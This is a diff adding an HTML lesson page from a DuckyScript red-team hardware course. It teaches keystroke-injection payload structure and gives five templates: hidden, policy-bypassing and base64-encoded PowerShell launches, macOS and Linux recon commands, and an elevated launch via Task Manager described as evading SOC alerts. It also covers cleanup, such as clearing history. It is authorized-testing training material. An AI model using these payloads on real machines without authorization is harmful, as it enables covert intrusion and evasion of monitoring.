@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <script src="../../../components/AccessGuard.js"></script>
+    <script>AccessGuard.require('sorted');</script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DuckyScript 03: Crafting Effective Payloads | Signal Red Team Hardware</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --bg: #0a0a0f; --bg-card: #0f0f18; --bg-code: #0d0d14;
+            --accent: #ff6b35; --accent-dim: rgba(255,107,53,0.12); --accent-border: rgba(255,107,53,0.3);
+            --text: #c8c8d8; --text-dim: #6b6b80; --text-bright: #e8e8f0;
+            --border: rgba(255,255,255,0.07);
+            --green: #4ade80; --yellow: #fbbf24; --red: #f87171; --blue: #60a5fa;
+        }
+        body { font-family: 'Segoe UI', system-ui, sans-serif; background: var(--bg); color: var(--text); line-height: 1.7; overflow-x: hidden; }
+        .scroll-bar { position: fixed; top: 0; left: 0; height: 2px; background: var(--accent); z-index: 200; width: 0%; transition: width 0.1s linear; }
+        .page-header { background: rgba(15,15,24,0.95); border-bottom: 1px solid var(--border); padding: 14px 40px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; backdrop-filter: blur(10px); }
+        .header-left { display: flex; align-items: center; gap: 16px; }
+        .back-btn { background: rgba(255,107,53,0.1); border: 1px solid var(--accent-border); color: var(--accent); padding: 6px 14px; border-radius: 4px; font-size: 0.8rem; text-decoration: none; transition: all 0.2s; }
+        .back-btn:hover { background: rgba(255,107,53,0.2); }
+        .course-label { font-size: 0.7rem; color: var(--text-dim); letter-spacing: 0.2em; text-transform: uppercase; }
+        .mod-badge { background: var(--accent-dim); border: 1px solid var(--accent-border); color: var(--accent); padding: 3px 10px; border-radius: 12px; font-size: 0.7rem; letter-spacing: 0.1em; }
+        .content { max-width: 1000px; margin: 0 auto; padding: 50px 40px; }
+        .ethical-banner { background: rgba(248,113,113,0.06); border: 1px solid rgba(248,113,113,0.2); border-radius: 8px; padding: 20px 24px; margin-bottom: 50px; }
+        .ethical-banner-title { font-size: 0.7rem; letter-spacing: 0.2em; text-transform: uppercase; color: var(--red); margin-bottom: 8px; }
+        .ethical-banner p { font-size: 0.88rem; color: #c8a0a0; margin-bottom: 0; }
+        .module-hero { text-align: center; padding: 50px 0 60px; border-bottom: 1px solid var(--border); margin-bottom: 60px; }
+        .module-number { font-size: 0.7rem; color: var(--accent); letter-spacing: 0.35em; text-transform: uppercase; margin-bottom: 14px; }
+        .module-title { font-size: 2.6rem; color: var(--text-bright); font-weight: 300; letter-spacing: 0.03em; margin-bottom: 16px; line-height: 1.2; }
+        .module-subtitle { font-size: 1rem; color: var(--text-dim); max-width: 680px; margin: 0 auto 28px; }
+        .meta-pills { display: flex; justify-content: center; gap: 12px; flex-wrap: wrap; }
+        .pill { padding: 5px 14px; border-radius: 20px; font-size: 0.72rem; letter-spacing: 0.08em; text-transform: uppercase; }
+        .pill-orange { background: var(--accent-dim); border: 1px solid var(--accent-border); color: var(--accent); }
+        .pill-green { background: rgba(74,222,128,0.1); border: 1px solid rgba(74,222,128,0.25); color: var(--green); }
+        .pill-blue { background: rgba(96,165,250,0.1); border: 1px solid rgba(96,165,250,0.25); color: var(--blue); }
+        .section { margin-bottom: 70px; opacity: 0; transform: translateY(20px); transition: opacity 0.5s ease, transform 0.5s ease; }
+        .section.visible { opacity: 1; transform: translateY(0); }
+        .section-label { font-size: 0.65rem; color: var(--accent); letter-spacing: 0.3em; text-transform: uppercase; margin-bottom: 8px; }
+        .section-title { font-size: 1.6rem; color: var(--text-bright); font-weight: 400; margin-bottom: 20px; padding-bottom: 12px; border-bottom: 1px solid var(--border); display: flex; align-items: center; gap: 12px; }
+        .section-icon { color: var(--accent); }
+        p { color: var(--text); margin-bottom: 16px; font-size: 0.97rem; }
+        .code-block { background: var(--bg-code); border: 1px solid rgba(255,107,53,0.15); border-radius: 6px; margin: 20px 0; overflow: hidden; }
+        .code-header { background: rgba(255,107,53,0.08); padding: 8px 16px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(255,107,53,0.12); }
+        .code-lang { font-size: 0.68rem; color: var(--accent); letter-spacing: 0.15em; text-transform: uppercase; }
+        .copy-btn { background: none; border: 1px solid var(--accent-border); color: var(--text-dim); padding: 3px 10px; border-radius: 3px; font-size: 0.7rem; cursor: pointer; transition: all 0.2s; }
+        .copy-btn:hover { background: var(--accent-dim); color: var(--accent); }
+        pre { padding: 20px; font-family: 'JetBrains Mono', 'Fira Code', 'Courier New', monospace; font-size: 0.88rem; line-height: 1.7; color: #e8e8f0; overflow-x: auto; }
+        .kw { color: #ff6b35; } .cm { color: #6b7280; font-style: italic; } .str { color: #4ade80; } .num { color: #60a5fa; }
+        .callout { border-radius: 6px; padding: 18px 22px; margin: 22px 0; border-left: 3px solid; }
+        .callout-warn { background: rgba(251,191,36,0.08); border-color: var(--yellow); }
+        .callout-danger { background: rgba(248,113,113,0.08); border-color: var(--red); }
+        .callout-info { background: var(--accent-dim); border-color: var(--accent); }
+        .callout-tip { background: rgba(74,222,128,0.08); border-color: var(--green); }
+        .callout-title { font-size: 0.72rem; letter-spacing: 0.2em; text-transform: uppercase; font-weight: 600; margin-bottom: 8px; }
+        .callout-warn .callout-title { color: var(--yellow); } .callout-danger .callout-title { color: var(--red); }
+        .callout-info .callout-title { color: var(--accent); } .callout-tip .callout-title { color: var(--green); }
+        .callout p { margin-bottom: 0; font-size: 0.9rem; }
+        table { width: 100%; border-collapse: collapse; margin: 20px 0; font-size: 0.88rem; }
+        th { background: rgba(255,107,53,0.08); color: var(--text-bright); padding: 11px 16px; text-align: left; font-size: 0.75rem; letter-spacing: 0.1em; text-transform: uppercase; border-bottom: 1px solid var(--accent-border); font-weight: 500; }
+        td { padding: 11px 16px; color: var(--text); border-bottom: 1px solid var(--border); vertical-align: top; }
+        tr:hover td { background: rgba(255,107,53,0.04); }
+        code { font-family: 'JetBrains Mono', 'Courier New', monospace; background: rgba(255,107,53,0.1); color: var(--accent); padding: 2px 6px; border-radius: 3px; font-size: 0.85em; }
+        ul.content-list { list-style: none; padding-left: 0; margin-bottom: 16px; }
+        ul.content-list li { padding: 6px 0 6px 22px; position: relative; color: var(--text); font-size: 0.95rem; }
+        ul.content-list li::before { content: '›'; position: absolute; left: 0; color: var(--accent); }
+        .template-card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 8px; margin: 20px 0; overflow: hidden; }
+        .template-header { background: rgba(255,107,53,0.06); padding: 14px 20px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
+        .template-title { font-size: 0.95rem; color: var(--text-bright); }
+        .template-os { font-size: 0.7rem; color: var(--text-dim); letter-spacing: 0.1em; }
+        .module-nav { display: flex; justify-content: space-between; align-items: center; padding: 30px 0; border-top: 1px solid var(--border); margin-top: 60px; }
+        .nav-btn { background: var(--bg-card); border: 1px solid var(--border); color: var(--text-dim); padding: 12px 20px; border-radius: 6px; text-decoration: none; font-size: 0.85rem; transition: all 0.2s; }
+        .nav-btn:hover { border-color: var(--accent-border); color: var(--accent); }
+        .nav-btn.next { background: var(--accent-dim); border-color: var(--accent-border); color: var(--accent); }
+        .nav-center { font-size: 0.75rem; color: var(--text-dim); }
+        .ascii-box { background: var(--bg-code); border: 1px solid var(--border); border-radius: 6px; padding: 20px; font-family: 'JetBrains Mono', 'Courier New', monospace; font-size: 0.82rem; color: #7dd3fc; line-height: 1.6; overflow-x: auto; margin: 20px 0; white-space: pre; }
+    </style>
+</head>
+<body>
+<div class="scroll-bar" id="scrollBar"></div>
+<header class="page-header">
+    <div class="header-left">
+        <a href="index.html" class="back-btn">&#8592; Red Team Hardware</a>
+        <span class="course-label">DuckyScript Mastery Course</span>
+    </div>
+    <div class="header-right"><span class="mod-badge">Module 03 of 08</span></div>
+</header>
+
+<main class="content">
+    <div class="ethical-banner">
+        <div class="ethical-banner-title">Authorized Use Only</div>
+        <p>All payload templates in this module are for use exclusively on systems you own or have explicit written authorization to test. Never deploy payloads on systems without proper engagement documentation.</p>
+    </div>
+
+    <div class="module-hero">
+        <div class="module-number">Module 03 — DuckyScript Mastery</div>
+        <h1 class="module-title">Crafting Effective Payloads</h1>
+        <p class="module-subtitle">Learn payload architecture, cross-platform deployment, PowerShell integration, timing strategies, and avoid the most common pitfalls that cause payloads to fail in the field.</p>
+        <div class="meta-pills">
+            <span class="pill pill-orange">Intermediate</span>
+            <span class="pill pill-green">~75 min</span>
+            <span class="pill pill-blue">5 Payload Templates</span>
+        </div>
+    </div>
+
+    <!-- Payload Structure -->
+    <div class="section" id="s1">
+        <div class="section-label">Section 1</div>
+        <h2 class="section-title"><span class="section-icon">&#9654;</span> Payload Structure: Setup, Execution, Cleanup</h2>
+        <p>Every professional payload follows a three-phase structure. Ad hoc scripts that skip phases leave evidence, fail on non-standard configurations, or crash mid-execution. Understanding this model is the difference between a reliable payload and one that works on your test box but fails in production.</p>
+
+        <div class="ascii-box">  PAYLOAD LIFECYCLE
+  ─────────────────────────────────────────────────────
+
+  PHASE 1: SETUP
+  ┌─────────────────────────────────────────────────┐
+  │ • Initial DELAY (device enumeration: 2000–5000ms)│
+  │ • DEFAULTDELAY set for target environment        │
+  │ • Verify focus is on correct window/field        │
+  │ • Handle any pending system notifications        │
+  └─────────────────────────────────────────────────┘
+                         │
+                         ▼
+  PHASE 2: EXECUTION
+  ┌─────────────────────────────────────────────────┐
+  │ • Launch interpreter (PowerShell/bash/cmd)       │
+  │ • Execute primary objective commands             │
+  │ • Handle UAC if required                         │
+  │ • Confirm successful execution                   │
+  └─────────────────────────────────────────────────┘
+                         │
+                         ▼
+  PHASE 3: CLEANUP
+  ┌─────────────────────────────────────────────────┐
+  │ • Close opened windows                           │
+  │ • Clear command history if applicable            │
+  │ • Return system to original state                │
+  │ • Optional: leave no Notepad/Terminal open       │
+  └─────────────────────────────────────────────────┘</div>
+    </div>
+
+    <!-- Opening Programs -->
+    <div class="section" id="s2">
+        <div class="section-label">Section 2</div>
+        <h2 class="section-title"><span class="section-icon">&#9654;</span> Opening Programs: Run Dialog and Shortcuts</h2>
+        <p>Getting a command interpreter open is the first execution step on most Windows payloads. The Run dialog (Win+R) is the most reliable entry point across Windows 7 through Windows 11, as it does not depend on the taskbar being accessible or any application being in focus.</p>
+
+        <table>
+            <thead><tr><th>Method</th><th>Commands</th><th>Reliability</th><th>Notes</th></tr></thead>
+            <tbody>
+                <tr><td>Run Dialog</td><td><code>GUI r</code></td><td>Very High</td><td>Works even when taskbar is hidden; available on lock screen</td></tr>
+                <tr><td>Win+X Menu</td><td><code>GUI x</code></td><td>High</td><td>Windows 10/11 only; may need navigation keys to find PowerShell</td></tr>
+                <tr><td>Search Bar</td><td><code>GUI s</code></td><td>Medium</td><td>Requires taskbar focus; works on Win10/11; slow to open</td></tr>
+                <tr><td>Task Manager</td><td><code>CTRL SHIFT ESCAPE</code></td><td>High</td><td>File > Run new task provides elevated Run dialog</td></tr>
+            </tbody>
+        </table>
+    </div>
+
+    <!-- Cross-Platform -->
+    <div class="section" id="s3">
+        <div class="section-label">Section 3</div>
+        <h2 class="section-title"><span class="section-icon">&#9654;</span> Windows vs macOS vs Linux Differences</h2>
+        <p>The same objective requires completely different keystrokes on different operating systems. Identify the target OS during your pre-engagement reconnaissance and tailor your payload accordingly.</p>
+
+        <table>
+            <thead><tr><th>Action</th><th>Windows</th><th>macOS</th><th>Ubuntu</th></tr></thead>
+            <tbody>
+                <tr><td>Open command interpreter</td><td><code>GUI r</code> → <code>cmd</code></td><td><code>COMMAND SPACE</code> → Terminal</td><td><code>CTRL ALT t</code></td></tr>
+                <tr><td>Open PowerShell</td><td><code>GUI r</code> → <code>powershell</code></td><td>N/A (use zsh/bash)</td><td>N/A</td></tr>
+                <tr><td>Elevated terminal</td><td><code>GUI x</code> → a</td><td><code>sudo</code> in terminal</td><td><code>sudo su</code></td></tr>
+                <tr><td>Super/Meta key label</td><td><code>GUI</code></td><td><code>COMMAND</code></td><td><code>GUI</code></td></tr>
+                <tr><td>Path separator</td><td>Backslash <code>\</code></td><td>Forward slash <code>/</code></td><td>Forward slash <code>/</code></td></tr>
+                <tr><td>Script execution</td><td>PowerShell .ps1</td><td>bash/zsh .sh</td><td>bash/python</td></tr>
+            </tbody>
+        </table>
+    </div>
+
+    <!-- 5 Templates -->
+    <div class="section" id="s4">
+        <div class="section-label">Section 4</div>
+        <h2 class="section-title"><span class="section-icon">&#9654;</span> Five Payload Templates</h2>
+
+        <!-- Template 1 -->
+        <div class="template-card">
+            <div class="template-header">
+                <span class="template-title">Template 1 — Hidden PowerShell Window</span>
+                <span class="template-os">Windows 10 / 11</span>
+            </div>
+            <div class="code-block" style="border:none;border-radius:0;margin:0;">
+                <div class="code-header">
+                    <span class="code-lang">DuckyScript</span>
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                </div>
+                <pre><span class="cm">REM Template 1: Open hidden PowerShell and run inline command</span>
+<span class="kw">DEFAULTDELAY</span> <span class="num">100</span>
+<span class="kw">DELAY</span> <span class="num">3000</span>
+
+<span class="kw">GUI</span> r
+<span class="kw">DELAY</span> <span class="num">700</span>
+<span class="kw">STRING</span> <span class="str">powershell -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command "YOUR_COMMAND_HERE"</span>
+<span class="kw">ENTER</span></pre>
+            </div>
+            <div style="padding:14px 20px;font-size:0.85rem;color:var(--text-dim);">The <code>-WindowStyle Hidden</code> flag prevents a visible PowerShell window from appearing. <code>-ExecutionPolicy Bypass</code> overrides any local policy blocking unsigned scripts. This is the foundation for nearly every Windows red team payload.</div>
+        </div>
+
+        <!-- Template 2 -->
+        <div class="template-card" style="margin-top:16px;">
+            <div class="template-header">
+                <span class="template-title">Template 2 — Encoded PowerShell Command</span>
+                <span class="template-os">Windows 10 / 11</span>
+            </div>
+            <div class="code-block" style="border:none;border-radius:0;margin:0;">
+                <div class="code-header">
+                    <span class="code-lang">DuckyScript + PowerShell Encoding</span>
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                </div>
+                <pre><span class="cm">REM Template 2: Base64-encoded command avoids special character issues
+REM Encode your command first:
+REM PS> [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('whoami'))</span>
+<span class="cm">REM Result: dwBoAG8AYQBtAGkA</span>
+
+<span class="kw">DEFAULTDELAY</span> <span class="num">100</span>
+<span class="kw">DELAY</span> <span class="num">3000</span>
+
+<span class="kw">GUI</span> r
+<span class="kw">DELAY</span> <span class="num">700</span>
+<span class="kw">STRING</span> <span class="str">powershell -NoP -W Hidden -Exec Bypass -Enc dwBoAG8AYQBtAGkA</span>
+<span class="kw">ENTER</span></pre>
+            </div>
+            <div style="padding:14px 20px;font-size:0.85rem;color:var(--text-dim);">Base64-encoded commands solve the problem of special characters (<code>&amp;</code>, <code>|</code>, <code>"</code>, <code>'</code>) being mangled by the Run dialog or keyboard layout differences. Always encode complex commands.</div>
+        </div>
+
+        <!-- Template 3 -->
+        <div class="template-card" style="margin-top:16px;">
+            <div class="template-header">
+                <span class="template-title">Template 3 — macOS Terminal Execution</span>
+                <span class="template-os">macOS 12 Monterey / 13 Ventura / 14 Sonoma</span>
+            </div>
+            <div class="code-block" style="border:none;border-radius:0;margin:0;">
+                <div class="code-header">
+                    <span class="code-lang">DuckyScript</span>
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                </div>
+                <pre><span class="cm">REM Template 3: macOS Spotlight → Terminal → command execution</span>
+<span class="kw">DEFAULTDELAY</span> <span class="num">150</span>
+<span class="kw">DELAY</span> <span class="num">3000</span>
+
+<span class="cm">REM Open Spotlight search</span>
+<span class="kw">COMMAND</span> SPACE
+<span class="kw">DELAY</span> <span class="num">800</span>
+
+<span class="cm">REM Type Terminal and open it</span>
+<span class="kw">STRING</span> <span class="str">Terminal</span>
+<span class="kw">DELAY</span> <span class="num">600</span>
+<span class="kw">ENTER</span>
+<span class="kw">DELAY</span> <span class="num">1500</span>
+
+<span class="cm">REM Execute command in Terminal</span>
+<span class="kw">STRING</span> <span class="str">system_profiler SPSoftwareDataType | grep 'System Version' > /tmp/sysinfo.txt</span>
+<span class="kw">ENTER</span>
+<span class="kw">DELAY</span> <span class="num">1000</span>
+
+<span class="cm">REM Close Terminal window</span>
+<span class="kw">COMMAND</span> w</pre>
+            </div>
+        </div>
+
+        <!-- Template 4 -->
+        <div class="template-card" style="margin-top:16px;">
+            <div class="template-header">
+                <span class="template-title">Template 4 — Linux Terminal via Keyboard Shortcut</span>
+                <span class="template-os">Ubuntu 22.04 LTS / Kali Linux 2024.x</span>
+            </div>
+            <div class="code-block" style="border:none;border-radius:0;margin:0;">
+                <div class="code-header">
+                    <span class="code-lang">DuckyScript</span>
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                </div>
+                <pre><span class="cm">REM Template 4: Ubuntu/Kali terminal shortcut</span>
+<span class="kw">DEFAULTDELAY</span> <span class="num">120</span>
+<span class="kw">DELAY</span> <span class="num">3000</span>
+
+<span class="cm">REM Open GNOME terminal (Ctrl+Alt+T — default shortcut)</span>
+<span class="kw">CTRL</span> ALT t
+<span class="kw">DELAY</span> <span class="num">1500</span>
+
+<span class="cm">REM Gather system information</span>
+<span class="kw">STRING</span> <span class="str">uname -a && id && ip a > /tmp/recon.txt 2>&1</span>
+<span class="kw">ENTER</span>
+<span class="kw">DELAY</span> <span class="num">1000</span>
+
+<span class="cm">REM Close terminal</span>
+<span class="kw">STRING</span> <span class="str">exit</span>
+<span class="kw">ENTER</span></pre>
+            </div>
+        </div>
+
+        <!-- Template 5 -->
+        <div class="template-card" style="margin-top:16px;">
+            <div class="template-header">
+                <span class="template-title">Template 5 — UAC Bypass via Task Manager</span>
+                <span class="template-os">Windows 10 / 11 — Elevated Execution</span>
+            </div>
+            <div class="code-block" style="border:none;border-radius:0;margin:0;">
+                <div class="code-header">
+                    <span class="code-lang">DuckyScript</span>
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                </div>
+                <pre><span class="cm">REM Template 5: Elevated PowerShell via Task Manager "Run new task"
+REM Works without triggering standard UAC prompt flow</span>
+<span class="kw">DEFAULTDELAY</span> <span class="num">120</span>
+<span class="kw">DELAY</span> <span class="num">3000</span>
+
+<span class="cm">REM Open Task Manager</span>
+<span class="kw">CTRL</span> SHIFT ESCAPE
+<span class="kw">DELAY</span> <span class="num">1200</span>
+
+<span class="cm">REM Click File menu (Alt+F)</span>
+<span class="kw">ALT</span> f
+<span class="kw">DELAY</span> <span class="num">400</span>
+
+<span class="cm">REM Click "Run new task"</span>
+<span class="kw">STRING</span> <span class="str">r</span>
+<span class="kw">DELAY</span> <span class="num">600</span>
+
+<span class="cm">REM Check "Create this task with admin privileges" checkbox</span>
+<span class="kw">TAB</span> <span class="cm">REM move to checkbox</span>
+<span class="kw">SPACE</span>
+
+<span class="cm">REM Type command and execute</span>
+<span class="kw">TAB</span>
+<span class="kw">STRING</span> <span class="str">powershell -NoP -Exec Bypass -W Hidden</span>
+<span class="kw">ENTER</span>
+<span class="kw">DELAY</span> <span class="num">1500</span></pre>
+            </div>
+            <div style="padding:14px 20px;font-size:0.85rem;color:var(--text-dim);">This technique opens an elevated task without the standard UAC elevation dialog that might alert a monitoring SOC. It works on non-admin local accounts on domain-joined machines where UAC prompts differ from stand-alone workstations.</div>
+        </div>
+    </div>
+
+    <!-- Pitfalls -->
+    <div class="section" id="s5">
+        <div class="section-label">Section 5</div>
+        <h2 class="section-title"><span class="section-icon">&#9654;</span> Common Pitfalls and How to Avoid Them</h2>
+
+        <table>
+            <thead><tr><th>Pitfall</th><th>Symptom</th><th>Fix</th></tr></thead>
+            <tbody>
+                <tr><td>Non-US keyboard layout</td><td>Special characters typed incorrectly (e.g., <code>\</code> becomes <code>#</code>)</td><td>Use Base64-encoded commands; avoid symbols in STRING; use environment variables like <code>$env:TEMP</code></td></tr>
+                <tr><td>Initial delay too short</td><td>First keystrokes go to wrong application or are dropped entirely</td><td>Use <code>DELAY 5000</code> for first payload run; reduce only after confirming reliability</td></tr>
+                <tr><td>UAC prompt interrupts payload</td><td>Payload pauses; waiting for elevation click</td><td>Use hidden PowerShell (-WindowStyle Hidden) to avoid UAC triggers; or account for UAC with explicit DELAY + navigate-and-confirm</td></tr>
+                <tr><td>Window focus lost</td><td>Keystrokes go to background window</td><td>Add DELAY after window-opening commands; use absolute paths in Run dialog to avoid Aero Snap</td></tr>
+                <tr><td>AutoCorrect or AutoComplete</td><td>Words get substituted or expanded unexpectedly</td><td>Disable autocorrect before testing; use PowerShell's -Command "..." syntax to bypass shell autocomplete</td></tr>
+                <tr><td>Screen saver activates</td><td>Payload runs but screen is locked mid-execution</td><td>Send periodic keystrokes (SHIFT alone) during long DELAY periods to prevent screen lock</td></tr>
+            </tbody>
+        </table>
+
+        <div class="callout callout-tip">
+            <div class="callout-title">Testing Workflow</div>
+            <p>Always test new payloads in a VM snapshot first. Take a snapshot before each test run so you can revert cleanly. Use a Windows 11 evaluation VM from Microsoft's developer downloads — it includes a 90-day license suitable for lab use.</p>
+        </div>
+    </div>
+
+    <nav class="module-nav">
+        <a href="ducky-course-02-basics.html" class="nav-btn">&#8592; Module 02: Fundamentals</a>
+        <span class="nav-center">Module 03 of 08</span>
+        <a href="ducky-course-04-recon.html" class="nav-btn next">Module 04: Reconnaissance &#8594;</a>
+    </nav>
+</main>
+
+<script>
+    window.addEventListener('scroll', () => {
+        const el = document.getElementById('scrollBar');
+        const doc = document.documentElement;
+        el.style.width = (doc.scrollTop / (doc.scrollHeight - doc.clientHeight) * 100) + '%';
+    });
+    const observer = new IntersectionObserver(entries => {
+        entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+    }, { threshold: 0.08 });
+    document.querySelectorAll('.section').forEach(s => observer.observe(s));
+    function copyCode(btn) {
+        const pre = btn.closest('.code-block').querySelector('pre');
+        navigator.clipboard.writeText(pre.innerText).then(() => {
+            btn.textContent = 'Copied!';
+            setTimeout(() => btn.textContent = 'Copy', 2000);
+        });
+    }
+</script>
+<script src="../../../components/FluxCapacitor.js"></script>
+</body>
+</html>
